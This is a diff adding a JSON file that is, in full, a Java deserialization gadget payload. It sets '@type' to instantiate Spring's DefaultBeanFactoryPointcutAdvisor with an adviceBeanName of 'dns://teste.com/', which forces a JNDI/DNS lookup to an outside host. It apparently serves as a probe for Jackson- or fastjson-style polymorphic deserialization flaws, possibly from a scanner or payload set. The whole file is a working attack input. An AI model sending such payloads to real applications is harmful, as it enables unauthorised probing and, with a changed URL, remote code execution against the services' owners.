@@ -1,0 +1,13 @@
+{
+  "@type": "java.util.Arrays$ArrayList",
+  "@items": [
+    {
+      "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
+      "adviceBeanName": "dns://teste.com/",
+      "pointcut": {
+        "@type": "org.springframework.aop.aspectj.AspectJExpressionPointcut",
+        "expression": "execution(* *.*(..))"
+      }
+    }
+  ]
+}
